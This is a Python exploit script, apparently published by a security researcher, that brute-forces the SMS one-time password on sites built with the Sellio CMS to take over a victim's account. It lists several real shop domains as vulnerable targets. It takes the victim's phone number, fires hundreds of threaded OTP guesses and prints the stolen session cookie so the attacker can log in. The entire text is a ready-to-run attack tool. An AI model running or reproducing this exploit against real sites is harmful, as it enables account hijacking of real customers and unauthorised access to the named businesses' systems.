# this write for crt proof of concept bypass login
# short list of site can work this poc
# www.shukherzel.co.il, www.meshekram.com, www.meshekya.co.il
# www.meshekya.co.il, www.regavimonline.co.il, www.shemeshfruits.co.il
# all this site powerd by cms : https://www.sellio.co.il
# 07/11/2021 
# twiiter : @0xSabzi 
# linkedin : https://www.linkedin.com/in/daniel-g-1677a2217 
# gitbub : https://github.com/ClickCyber/CMS-Sellio
# python3 "sellio poc.py" -d domain -c start phone 055,052... -p numbert without 05*(....) -t how much thraeds run if server is slow use 300 
import requests, bs4, threading, termcolor, time, sys, argparse
session = requests.Session()
process = True
keyboard_extension = {
    "050":"36", "052":"37", "053":"38", "054":"39", 
    "055":"40","056":"41", "058":"42", "059":"43"
}
banner_end = """
      __    ___  ___       __       __            
|  | |__) |  |  |__  |  | |__) .   |  \  /\  |\ | 
|/\| |  \ |  |  |___ \__/ |    .   |__/ /~~\ | \|"""
banner = """
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀      ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌               ▐░▌          ▐░▌          ▐░▌          ▐░▌               ▐░▌     ▐░▌       ▐░▌
▐░▌          ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌               ▐░▌     ▐░▌       ▐░▌
▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░▌               ▐░▌     ▐░▌       ▐░▌
▐░▌          ▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌      ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌               ▐░▌     ▐░▌       ▐░▌
▐░▌          ▐░▌       ▐░▌          ▐░▌               ▐░▌▐░▌          ▐░▌          ▐░▌               ▐░▌     ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌      ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀
@twiiter : @0xSabzi @linkedin : https://www.linkedin.com/in/daniel-g-1677a2217"""
def get_token():
    res = session.get(url)
    slice = bs4.BeautifulSoup(res.text, 'html.parser')
    return slice.find('input', {"name":"_token", "type":"hidden"}).get("value").strip()

def send_code_phone(token, code, phone):
    res = session.post(f'{url}/frontend/check_phone', data={
        'extension':keyboard_extension[code], 'phone_number':phone, '_token':token})
    
    if res.json()["status"] == "success":
        return True
    return False

def apprvol_code(token, code):
    global process
    try:
        res = session.post(f'{url}/frontend/check_otp', data={'_token':token, 'otp':code})
    except:
        time.sleep(10)
        return apprvol_code(token, code)
    if res.json()["is_login"] == 1:
        process = False
        print(termcolor.colored(f'[+] json=> {res.json()}', 'green'))
        print(termcolor.colored(f'[+] laravel_session={res.cookies.get_dict()}', 'yellow'))
        print(termcolor.colored(f'[+] set cookie and go to site : {url}', 'yellow'))

def send_code(token):
    code = 999
    while process:
        if threading.active_count() == parser.threads:
            print(termcolor.colored('[+] mode sleep MAX thread', 'red'), end='\r')
            time.sleep(20)
            continue
        print(termcolor.colored(f'[+] trying => {code}', 'green'), end='\r')
        threading.Thread(target=apprvol_code, args=(token, code)).start()
        time.sleep(0.01)
        code += 1

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ByPass the CMS Sellio Writeup By: $Dan.')
    parser.add_argument('--domain', '-d', type=str, required=True,
                     help='this host are you want attack')
    parser.add_argument('--threads', '-t', type=int, default=500,
                     help='how much thread run in one time')
    parser.add_argument('--phone', '-p', type=str, required=True,
                     help='this phone number of account you want Hacked')
    parser.add_argument('--code', '-c', type=str, required=True,
                     help='this code start phone number of account you want Hacked')
    parser = parser.parse_args()
    url = f'https://{parser.domain}'
    token = get_token()
    print(banner)
    print(termcolor.colored('[+] exploit CMS : https://www.sellio.co.il/', 'green'))
    print(termcolor.colored(f'[+] token => {token}', 'green'))
    if send_code_phone(token, parser.code.strip(), parser.phone.strip()):
        print(termcolor.colored(f'[+] send uuid {parser.code + parser.phone}', 'green'))
        send_code(token)
    else:
        print(termcolor.colored('[-] POC is crash maybey number not valid or somting else', 'red'))
    print(banner_end)
    sys.exit(404)